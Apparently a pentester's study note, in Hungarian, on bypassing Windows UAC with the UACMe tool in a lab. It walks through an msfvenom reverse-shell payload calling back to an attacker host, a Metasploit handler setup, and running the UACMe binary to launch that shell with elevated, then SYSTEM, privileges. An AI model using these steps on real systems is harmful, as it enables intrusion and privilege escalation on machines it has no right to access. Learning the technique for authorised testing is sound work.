# UAC bypass with UACMe
## infos
* Windows Vista-tol minden kliens Windows-ban ott van
* minden elaveted privilege-t igenylo muvelet eseten
  * rendszergazdanak feldob egy ablakot, hogy hagyja jova igen gombbal (consent form)
  * atlag user eseten, pedig admin credentialt ker a usertol (credential prompt)
* az UAC bypassolhato
 * teljesen ki tudjuk kerulni az egesz UAC-t
 * es ha cli-ben futtatunk valamit, nem leszunk emiatt blokkolva
 * mindenkepp admin account kell hozza!!!!
 * csak a consent dialogbox-ot kell bypassolni
* UAC protection levels (low - high)
 * ha high-ra van allitva, akkor nem dob fel consent dialog boxot
* windows verzionkent valtozo hogy milyen tool vagy technique kell hozza
* egyebkent az UAC-t mi is ki tudjuk kapcsolni GUI-ban (meg tuti CLI-ben is)
* ha a legmagasabbra van allitva, akkor nehez bypassolni
 * mert eleve az atallitashoz is feldobna a consent dialogbox-ot
## UACMe
* https://github.com/hfiref0x/UACME
* 60 exploit van hozza - kulon 1-1 minden windows verziohoz
* tobbnyire csak source van fent
  * direkt nem raknak fel binary-t mert akkor maliciousnek lenne a github repo belyegezve
### steps
* initial foothold (lehetoleg meterpreter shell-el)
* ha kell migraljunk x64-es processre
  * ps
  * migrate <pid>
* generating reverse shell with msfvenom
  * msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe -o shell.exe
* beallitani a handler-t egy masik msfconsole tab-on
  * use multi/handler
  * set payload windows/meterpreter/reverse_tcp
  * set lhost = 10.10.10.1
  * set lport = 1234
* create UACMe payload
  * download from github
  * compile to target windows build version (if not stored somewhere in the test vm locally)
* upload UACMe payload and msfvenom payload to target system
* lefuttatjuk az uac bypass executable-t egyutt azzal a binarissal amit elevated priv-el akarunk futtatni (jelen esetben ez a reverse shell)
  * .\uacme_payload.exe <num> C:\Users\steve\Desktop\shell.exe     // !!!! nagyon fontos, hogy a shell.exe-nek absolute eleresi ut kell !!!! relative-al nem mukodik!!!!
* meg is van a shell
  * igeny szerint migraljunk egy masik processre ami NT AUTHORITY/SYSTEM
